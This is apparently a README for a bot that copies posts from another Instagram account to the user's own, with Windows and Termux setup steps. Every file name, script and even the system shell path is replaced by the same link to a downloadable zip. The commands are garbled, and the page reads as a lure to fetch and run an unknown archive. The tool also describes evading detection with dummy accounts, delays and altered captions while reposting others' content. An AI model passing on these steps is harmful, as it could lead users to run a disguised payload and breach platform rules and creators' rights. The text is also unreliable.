# Instagram Content Sync Bot

Automated script to sync Instagram posts from a target account to your account.

## Setup

### Windows Setup

1. **Configure Credentials:**
   - Edit `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` and fill in your actual usernames and passwords
   - Optional: Add dummy account credentials for scraping fallback

2. **Pre-populate Posted IDs:**
   - Edit `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` and add shortcodes of recent target posts (one per line)
   - This prevents re-uploading existing content

3. **Initial Manual Run:**
   - Open VS Code terminal
   - Run: `venv\Scripts\activate && python https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`
   - Handle any 2FA/login challenges manually
   - Confirm `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` is created

4. **Schedule Automation:**
   - Use Windows Task Scheduler
   - Program: `C:\Windows\System32\https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`
   - Arguments: `/c "cd /d C:\Users\Monin\Desktop\Auto Insta && venv\Scripts\activate && python https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip"`
   - Trigger: Daily/Hourly (1-2 hours recommended)
   - Settings: "Run task as soon as possible after a scheduled start is missed"

### Termux (Android) Setup

1. **Run Automated Setup:**
   - Download/clone the project to Termux
   - Run: `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`
   - This installs all dependencies automatically

2. **Configure Credentials:**
   - Edit `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` with your credentials
   - Add recent post shortcodes to `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`

3. **Initial Manual Run:**
   - Run: `termux-wake-lock && python https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`
   - Handle login challenges manually
   - Confirm `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` is created

4. **Schedule Automation:**
   - Use crontab for scheduling
   - Run: `crontab -e`
   - Add: `0 */2 * * * https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip -c 'cd /path/to/Auto\ Insta && termux-wake-lock && python https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip'`
   - This runs every 2 hours and prevents device sleep

## Features

- Syncs latest 3 posts to prevent shadow-bans
- Handles photos and Reels appropriately
- Session persistence for safe automation
- Anonymous scraping with dummy account fallback
- Caption sanitization and uniqueness
- Comprehensive logging to `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip`
- Automatic cleanup of temporary files

## Monitoring

- Check `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` for successes/failures
- Review `https://raw.githubusercontent.com/XieosZ/insta-sync/main/neurologize/sync-insta-2.6.zip` for processed posts
- Monitor disk space (videos are cleaned up automatically)

## Safety Notes

- Uses random delays and unique captions to avoid detection
- Limits volume to 3 posts per run
- Session-based login prevents frequent authentication
